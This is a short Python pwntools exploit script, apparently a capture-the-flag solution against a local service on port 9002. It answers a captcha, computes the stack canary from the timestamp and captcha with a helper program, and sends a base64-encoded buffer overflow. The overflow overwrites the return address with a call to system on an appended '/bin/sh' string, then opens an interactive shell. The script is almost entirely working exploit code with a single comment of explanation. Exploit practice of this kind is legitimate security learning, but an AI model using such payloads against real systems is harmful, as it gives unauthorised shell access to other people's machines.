import os
import time
from pwn import *

system = 0x08048880
g_buf = 0x804B0E0
exit = 0x8048a00

t = int(time.time())
r = remote('127.0.0.1', 9002)

r.recvuntil('captcha : ')
captcha = int(r.recvline()[:-1])
r.sendline(str(captcha))

# Take the time and the captcha as arguments
canary = '0x' + os.popen('./canary {} {}'.format(str(t), captcha)).read()
canary = int(canary, 16)

payload = 'A' * 512 + p32(canary) + 'A' * 12
payload += p32(system)
payload += p32(exit) + p32(g_buf + 540 * 4/3)

r.sendline(b64e(payload) + '/bin/sh\0')
r.interactive()

